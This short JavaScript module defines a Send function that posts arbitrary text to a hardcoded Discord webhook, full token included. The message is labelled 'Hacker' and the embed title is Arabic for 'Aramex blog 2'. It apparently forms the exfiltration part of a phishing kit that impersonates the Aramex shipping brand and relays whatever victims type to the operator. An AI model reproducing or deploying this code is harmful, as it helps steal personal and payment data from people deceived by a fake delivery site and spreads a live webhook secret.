import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة ارامكس ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1322961566051733586/2nWa4w2RFJoB1Tis4S3YZ2O0aXoskce1Lelo47OwCwoDl9bOVf-NjVNmc2cPr-5QRWyP",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
